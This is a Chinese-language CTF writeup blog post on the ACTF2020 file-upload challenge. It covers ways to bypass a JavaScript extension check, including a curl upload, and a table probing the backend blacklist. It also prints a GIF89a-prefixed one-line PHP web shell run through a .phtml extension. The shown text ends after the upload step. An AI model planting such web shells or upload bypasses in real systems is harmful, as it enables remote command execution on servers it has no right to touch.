@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.1.14/fancybox/fancybox.css" integrity="sha256-mdaMxrItEW6hMIVJJNPKuX0B7KCSJQVEv3mVY4N2we4=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"quellisya.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前端校验、后缀黑名单都试过之后，把后缀换成 .phtml 并把 .htaccess 传上去，让服务器认这个后缀，最后拿到 flag。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[ACTF2020 新生赛] Upload：黑名单漏掉了 .phtml">
+<meta property="og:url" content="https://quellisya.github.io/2026/10/24/web-ctf-upload-actf2020/index.html">
+<meta property="og:site_name" content="Quellisya&#39;s Blog">
+<meta property="og:description" content="前端校验、后缀黑名单都试过之后，把后缀换成 .phtml 并把 .htaccess 传上去，让服务器认这个后缀，最后拿到 flag。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-10-24T03:40:00.000Z">
+<meta property="article:modified_time" content="2026-10-28T12:30:00.000Z">
+<meta property="article:author" content="Quellisya">
+<meta property="article:tag" content=".htaccess">
+<meta property="article:tag" content="ACTF">
+<meta property="article:tag" content="后缀绕过">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://quellisya.github.io/2026/10/24/web-ctf-upload-actf2020/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://quellisya.github.io/2026/10/24/web-ctf-upload-actf2020/","path":"/2026/10/24/web-ctf-upload-actf2020/","title":"[ACTF2020 新生赛] Upload：黑名单漏掉了 .phtml"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[ACTF2020 新生赛] Upload：黑名单漏掉了 .phtml | Quellisya's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.1.14/fancybox/fancybox.umd.js" integrity="sha256-QnJV4HT5r8i89ovZGRD86iynZqHerEbT2xt69vDM36I=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.1/pangu.umd.js" integrity="sha256-kRsxecBnwG6mULFPe2E6UKnNm8XfDOuDwCOprjLZuX8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script><script src="/js/pjax.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","display_overflow":"scroll","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/4.1.3/tex-mml-chtml.js","integrity":"sha256-ihPtDDm7pTmSF9ViEsItlvsrBTsNkz0MOXMchzOwCQw="}}</script>
+<script src="/js/third-party/math/mathjax.js" defer></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Quellisya's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Quellisya's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTF · Web Security · Writeups</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>RSS</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%82%E5%AF%9F%E9%A2%98%E7%9B%AE"><span class="nav-number">1.</span> <span class="nav-text">观察题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E5%88%B0%E5%BA%95%E6%8B%A6%E4%BA%86%E4%BB%80%E4%B9%88"><span class="nav-number">2.</span> <span class="nav-text">前端到底拦了什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%8E%E4%B9%88%E6%8A%8A-phtml-%E5%8F%91%E5%87%BA%E5%8E%BB%EF%BC%88%E4%B8%8D%E7%94%A8-Burp%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">怎么把 .phtml 发出去（不用 Burp）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%91%B8%E6%B8%85%E5%90%8E%E7%AB%AF%E7%9A%84%E9%BB%91%E5%90%8D%E5%8D%95"><span class="nav-number">4.</span> <span class="nav-text">摸清后端的黑名单</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%93%AA%E4%B8%AA%E5%90%8E%E7%BC%80%E4%BC%9A%E8%A2%AB-PHP-%E8%A7%A3%E6%9E%90"><span class="nav-number">5.</span> <span class="nav-text">关键一步：哪个后缀会被 PHP 解析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%9C%A8%E9%A9%AC%E5%B9%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">6.</span> <span class="nav-text">构造木马并上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%8B%BF-flag"><span class="nav-number">7.</span> <span class="nav-text">执行命令，拿 flag</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Quellisya</p>
+  <div class="site-description" itemprop="description">记录 CTF、Web 安全的学习笔记与 Writeup，尽量把每一步讲清楚。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://quellisya.github.io/2026/10/24/web-ctf-upload-actf2020/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Quellisya">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Quellisya's Blog">
+      <meta itemprop="description" content="记录 CTF、Web 安全的学习笔记与 Writeup，尽量把每一步讲清楚。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[ACTF2020 新生赛] Upload：黑名单漏掉了 .phtml | Quellisya's Blog">
+      <meta itemprop="description" content="前端校验、后缀黑名单都试过之后，把后缀换成 .phtml 并把 .htaccess 传上去，让服务器认这个后缀，最后拿到 flag。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [ACTF2020 新生赛] Upload：黑名单漏掉了 .phtml
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-10-24 11:40:00" itemprop="dateCreated datePublished" datetime="2026-10-24T11:40:00+08:00">2026-10-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-10-28 20:30:00" itemprop="dateModified" datetime="2026-10-28T20:30:00+08:00">2026-10-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/web/file-upload/" itemprop="url" rel="index"><span itemprop="name">文件上传</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">前端校验、后缀黑名单都试过之后，把后缀换成 .phtml 并把 .htaccess 传上去，让服务器认这个后缀，最后拿到 flag。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+<nav class="series-nav">
+  <div class="series-nav__head">
+    <i class="fa fa-layer-group"></i>
+    <span class="series-nav__name">系列：文件上传</span>
+    <span class="series-nav__count">第 2 / 3 篇</span>
+  </div>
+  <ol class="series-nav__list"><li><a href="&#x2F;2026&#x2F;10&#x2F;24&#x2F;web-knowledge-upload-basics&#x2F;">文件上传基础：校验点、可执行后缀与常见坑</a></li><li class="is-current"><a href="&#x2F;2026&#x2F;10&#x2F;24&#x2F;web-ctf-upload-actf2020&#x2F;">[ACTF2020 新生赛] Upload：黑名单漏掉了 .phtml</a></li><li><a href="&#x2F;2026&#x2F;10&#x2F;24&#x2F;web-ctf-upload-geek2019&#x2F;">[极客大挑战 2019] Upload：GIF89a 与 PHP 短标签绕过</a></li></ol>
+  <div class="series-nav__links"><a class="series-nav__prev" href="&#x2F;2026&#x2F;10&#x2F;24&#x2F;web-knowledge-upload-basics&#x2F;"><i class="fa fa-arrow-left"></i>文件上传基础：校验点、可执行后缀与常见坑</a><a class="series-nav__next" href="&#x2F;2026&#x2F;10&#x2F;24&#x2F;web-ctf-upload-geek2019&#x2F;">[极客大挑战 2019] Upload：GIF89a 与 PHP 短标签绕过<i class="fa fa-arrow-right"></i></a></div>
+</nav><h2 id="观察题目"><a href="#观察题目" class="headerlink" title="观察题目"></a>观察题目</h2><p>打开靶机，页面很朴素，只有一个上传表单：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return checkFile()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;input_file&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload_file&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;upload&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>把页面上的线索拆开看：</p>
+<table>
+<thead>
+<tr>
+<th>线索</th>
+<th>值</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>form</code> 的 <code>action</code></td>
+<td>空</td>
+<td>提交回 <code>index.php</code> 自身处理</td>
+</tr>
+<tr>
+<td>文件字段名</td>
+<td><code>upload_file</code></td>
+<td>后面构造请求时要用</td>
+</tr>
+<tr>
+<td><code>onsubmit</code></td>
+<td><code>return checkFile()</code></td>
+<td>提交前有一段前端校验</td>
+</tr>
+<tr>
+<td>响应头</td>
+<td><code>X-Powered-By: PHP/5.6.40</code></td>
+<td>PHP 5.x，支持一些 PHP 7 已移除的老式写法</td>
+</tr>
+</tbody></table>
+<h2 id="前端到底拦了什么"><a href="#前端到底拦了什么" class="headerlink" title="前端到底拦了什么"></a>前端到底拦了什么</h2><p>看 <code>js/main.js</code>：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传jpg、png、gif结尾的图片噢！&quot;</span>;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它只做了一件事：<strong>取文件名最后一个点之后的内容，判断是不是 <code>.jpg</code> &#x2F; <code>.png</code> &#x2F; <code>.gif</code>。</strong></p>
+<p>也就是说，只要你选的文件叫 <code>xxx.phtml</code>，浏览器就会弹窗、表单不提交。但这只是浏览器里的提示。</p>
+<div class="note warning"><p>前端只认<strong>最后一个点</strong>后面的内容。<code>shell.phtml</code> 会被拦，<code>shell.jpg</code> 会放行——代价是服务端真的把文件存成 <code>.jpg</code>，永远不会执行。这是我踩过的第一个坑，详见<a href="/2026/10/24/web-knowledge-upload-basics/">《文件上传基础》</a>里的「我踩过的坑」。</p>
+</div>
+
+<h2 id="怎么把-phtml-发出去（不用-Burp）"><a href="#怎么把-phtml-发出去（不用-Burp）" class="headerlink" title="怎么把 .phtml 发出去（不用 Burp）"></a>怎么把 <code>.phtml</code> 发出去（不用 Burp）</h2><p>这是新手最容易卡住的地方：<strong>页面上只有一个按钮，我怎么传别的后缀？</strong></p>
+<p>关键认知：<strong>前端校验和文件最终存成什么后缀，是两件事。</strong> 前者看浏览器里的文件名，后者看 HTTP 请求里的 <code>filename</code> 字段。我们要做的是让请求里的 <code>filename</code> 保持 <code>.phtml</code>，同时让那段 JS 不生效。</p>
+<div class="tabs" id="upload-bypass"><ul class="nav-tabs"><li class="tab active"><a href="#upload-bypass-1"><i class="fa fa-code"></i>方法一 · 禁用 JS</a></li><li class="tab"><a href="#upload-bypass-2"><i class="fa fa-magic"></i>方法二 · 覆盖函数</a></li><li class="tab"><a href="#upload-bypass-3"><i class="fa fa-wrench"></i>方法三 · 删属性</a></li><li class="tab"><a href="#upload-bypass-4"><i class="fa fa-terminal"></i>方法四 · 命令行</a></li></ul><div class="tab-content"><div class="tab-pane active" id="upload-bypass-1"><p>最简单，也最适合第一次操作。</p>
+<ol>
+<li>打开靶机首页，按 <code>F12</code> 打开开发者工具；</li>
+<li>在 DevTools 里按 <code>Ctrl+Shift+P</code> 打开命令面板；</li>
+<li>输入 <code>Disable JavaScript</code> 并回车；</li>
+<li>回到页面按 <code>F5</code> 刷新；</li>
+<li>选择 <code>xxx.phtml</code>，点 upload。</li>
+</ol>
+<p>JS 被禁用后，<code>onsubmit</code> 里的代码不会执行，表单就是一个普通的 HTML 表单，直接提交。</p>
+<div class="note warning"><p><strong>注意别关掉 F12，一关 JS 就恢复了。</strong></p>
+</div></div><div class="tab-pane" id="upload-bypass-2"><p>在 Console 里执行：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">checkFile</span> = <span class="function">() =&gt;</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
+
+<p>然后<strong>不要刷新</strong>，直接选文件上传。<code>onsubmit</code> 调用到的就是被替换后的函数。</p></div><div class="tab-pane" id="upload-bypass-3"><p>F12 → Elements → 找到 <code>&lt;form ... onsubmit=&quot;return checkFile()&quot;&gt;</code>，双击删掉 <code>onsubmit</code> 这一段，再点上传。</p></div><div class="tab-pane" id="upload-bypass-4"><p>完全绕开浏览器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -F <span class="string">&quot;upload_file=@shell.phtml;type=image/jpeg&quot;</span> \</span><br><span class="line">     -F <span class="string">&quot;submit=upload&quot;</span> \</span><br><span class="line">     <span class="string">&quot;http://&lt;靶机地址&gt;/&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>-F</code> 会把本地文件拼成 <code>multipart/form-data</code>，<code>filename</code> 自动使用本地文件名，天然带 <code>.phtml</code>，完全绕开前端。</p></div></div></div>
+
+<div class="note danger"><p><strong>不要用“把文件改名成 .jpg”这种方式过前端。</strong> 因为 <code>filename</code> 会跟着变成 <code>.jpg</code>，服务端就真的存成 <code>.jpg</code> 了——能上传成功，但永远不会执行。<strong>改的是请求，不是文件。</strong></p>
+</div>
+
+<h2 id="摸清后端的黑名单"><a href="#摸清后端的黑名单" class="headerlink" title="摸清后端的黑名单"></a>摸清后端的黑名单</h2><p>前端过了，后端还得试。做法是<strong>同一份内容，换不同后缀分别上传</strong>，观察返回：</p>
+<table>
+<thead>
+<tr>
+<th>文件名</th>
+<th>后端返回</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>a.php</code></td>
+<td><code>nonono~ Bad file！</code></td>
+<td><mark class="label danger">拦截</mark></td>
+</tr>
+<tr>
+<td><code>a.php5</code></td>
+<td><code>nonono~ Bad file！</code></td>
+<td><mark class="label danger">拦截</mark></td>
+</tr>
+<tr>
+<td><code>a.jpg.php</code></td>
+<td><code>nonono~ Bad file！</code></td>
+<td><mark class="label danger">拦截</mark></td>
+</tr>
+<tr>
+<td><code>a.phtml</code></td>
+<td><code>Upload Success! Look here~ ./uplo4d/7105...phtml</code></td>
+<td><mark class="label success">落盘</mark></td>
+</tr>
+<tr>
+<td><code>a.pht</code></td>
+<td>同上</td>
+<td><mark class="label success">落盘</mark></td>
+</tr>
+<tr>
+<td><code>a.php.jpg</code></td>
+<td>同上，但存成 <code>.jpg</code></td>
+<td><mark class="label warning">不可执行</mark></td>
+</tr>
+</tbody></table>
+<p>几条结论：</p>
+<ol>
+<li>后端也检查后缀，而且是<strong>黑名单</strong>，明确拦了 <code>php</code>、<code>php5</code>；</li>
+<li>判断方式同样是“取最后一个扩展名”，所以 <code>a.php.jpg</code> 会被当成 jpg 放行，存成 <code>.jpg</code> 自然没用；</li>
+<li>黑名单漏掉了 <code>phtml</code> 和 <code>pht</code>。</li>
+</ol>
+<p>另外，成功回显里直接给出了<strong>存储目录</strong>（<code>./uplo4d/</code>，注意是数字 4）和<strong>完整文件名</strong>，省去了爆破路径的功夫。</p>
+<h2 id="关键一步：哪个后缀会被-PHP-解析"><a href="#关键一步：哪个后缀会被-PHP-解析" class="headerlink" title="关键一步：哪个后缀会被 PHP 解析"></a>关键一步：哪个后缀会被 PHP 解析</h2><p><code>.phtml</code> 和 <code>.pht</code> 都传上去了，但“能上传”不代表“能执行”。直接访问两个文件对比：</p>
+<table>
+<thead>
+<tr>
+<th>后缀</th>
+<th>响应头</th>
+<th>响应体</th>
+<th>是否执行</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>.phtml</code></td>
+<td><code>Content-Type: text/html</code></td>
+<td><code>GIF89a / PWNED</code></td>
+<td><mark class="label success">执行了</mark></td>
+</tr>
+<tr>
+<td><code>.pht</code></td>
+<td><code>Content-Type: image/gif</code></td>
+<td><code>GIF89a</code></td>
+<td><mark class="label danger">没执行</mark></td>
+</tr>
+</tbody></table>
+<p><code>.phtml</code> 被执行，说明服务端有 mime 映射。拿到 shell 后可以直接看根因：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /var/www/html/.htaccess</span></span><br><span class="line"><span class="section">&lt;FilesMatch \.phtml$&gt;</span></span><br><span class="line">    <span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这就是本题的题眼：<strong>黑名单只防了 <code>.php</code>，而 <code>.htaccess</code> 又把 <code>.phtml</code> 交给了 PHP 处理。</strong> 两者一叠加，绕过路径就唯一确定了。</p>
+<div class="note info"><p>如果题目的 <code>.htaccess</code> 里是 <code>AddHandler</code> 或 <code>AddType</code>，行为会有差别：<code>AddHandler</code> 对多后缀文件也生效，<code>AddType</code> 只认最后一个扩展名。遇到上传题，一定要把服务器配置（<code>.htaccess</code>、<code>httpd.conf</code>）当成线索来看。</p>
+</div>
+
+<h2 id="构造木马并上传"><a href="#构造木马并上传" class="headerlink" title="构造木马并上传"></a>构造木马并上传</h2><p>很多上传点会校验文件头，加一个 <code>GIF89a</code> 是零成本的保险，而且完全不影响 PHP 解析——PHP 遇到 <code>&lt;?php</code> 之前的非 PHP 文本会原样输出。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;c&quot;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>保存为 <code>shell.phtml</code>，用 1.3 里的任意一种方式上传，回显：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Upload Success! Look here~ ./uplo4d/79c93a6bf07761fcc2a020e149f3fc60.phtml</span><br></pre></td></tr></table></figure>
+
+<p>这里有个有意思的细节：<strong>这个“随机”文件名其实是 <code>md5(原文件名)</code></strong>。验算一下：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(&quot;shell.phtml&quot;) = 79c93a6bf07761fcc2a020e149f3fc60</span><br></pre></td></tr></table></figure>
+
+<div class="note success"><p>路径是<strong>可预测</strong>的——就算不回显，也能自己算出来。服务端把用户提交的 <code>filename</code> 原样拿去做 md5，这本身也是一个可以记录下来的信息泄露点。</p>
+</div>
+
